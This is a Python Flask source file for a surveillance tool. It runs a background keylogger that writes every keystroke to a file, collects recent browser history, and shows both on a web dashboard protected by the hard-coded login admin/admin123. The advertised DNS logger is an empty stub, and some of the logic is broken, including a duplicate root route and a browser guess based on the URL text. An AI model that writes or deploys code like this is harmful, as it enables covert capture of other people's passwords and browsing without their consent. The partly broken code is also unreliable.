import os
from flask import Flask, render_template, request, redirect, url_for
from pynput.keyboard import Listener
from datetime import datetime, timedelta
import threading
import logging
from browser_history import get_history

app = Flask(__name__)

# Variables to store keystrokes, URLs, and DNS logs
keystrokes_file = "keystrokes.txt"
urls_file = "urls.txt"
dns_file = "dnslog.txt"
username = "admin"
password = "admin123"

# Create files if not exist
for file in [keystrokes_file, urls_file, dns_file]:
    if not os.path.exists(file):
        open(file, "w", encoding='utf-8').close()

# Function to log keystrokes
def log_keystrokes(key):
    key = str(key).replace("'", "")  # Clean the key format
    with open(keystrokes_file, "a", encoding='utf-8') as f:
        f.write(f"{datetime.now()}: {key}\n")

# DNS logger functionality using scapy
def dns_logger():
    logging.basicConfig(filename=dns_file, level=logging.INFO, format='%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

# Start keylogger and DNS logger as background threads
def start_keylogger():
    listener = Listener(on_press=log_keystrokes)
    listener.start()

def start_dns_logger():
    dns_thread = threading.Thread(target=dns_logger)
    dns_thread.daemon = True
    dns_thread.start()

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        input_username = request.form['username']
        input_password = request.form['password']
        if input_username == username and input_password == password:
            return redirect(url_for('keystrokes'))
        else:
            return render_template('index.html', error="Invalid Credentials")
    return render_template('index.html')

@app.route('/keystrokes')
def keystrokes():
    keystrokes_data = []
    with open(keystrokes_file, 'r', encoding='utf-8') as f:
        for line in f:
            # Split the line into date-time and keystroke parts
            try:
                date_time, keystroke = line.strip().split(": ", 1)
                keystrokes_data.append((date_time, keystroke))
            except ValueError:
                continue  # Skip lines that don't match the format

    return render_template('keystrokes.html', keystrokes=keystrokes_data)

@app.route('/urls')
def urls():
    outputs = get_history()
    history = outputs.histories  # List of (datetime, url, title) tuples

    formatted_history = []
    two_days_ago = datetime.now() - timedelta(days=2)

    # Make sure both dates are naive
    two_days_ago = two_days_ago.replace(tzinfo=None)

    for dt, url, title in history:
        # Ensure dt is naive
        dt = dt.replace(tzinfo=None)

        # Filter for the last two days
        if dt >= two_days_ago:
            # Determine browser based on the source of the history
            browser_name = "Unknown"
            if 'chrome' in url:
                browser_name = "Chrome"
            elif 'firefox' in url:
                browser_name = "Firefox"
            elif 'safari' in url:
                browser_name = "Safari"
            elif 'edge' in url:
                browser_name = "Edge"
            elif 'opera' in url:
                browser_name = "Opera"

            formatted_time = dt.strftime('%Y-%m-%d %I:%M %p')  # Include date
            formatted_history.append((formatted_time, title, url, browser_name))

            # Save to urls.txt with UTF-8 encoding
            with open(urls_file, "a", encoding='utf-8') as f:
                f.write(f"{formatted_time} - {browser_name} - {title} - {url}\n")

    return render_template('urls.html', history=formatted_history)


@app.route('/dns')
def dns():
    with open(dns_file, 'r', encoding='utf-8') as f:
        dns_data = f.readlines()
    return render_template('dns.html', dns=dns_data)

@app.route('/')
def index():
    return render_template('index.html')


if __name__ == "__main__":
    start_keylogger()
    start_dns_logger()
    app.run(debug=True)
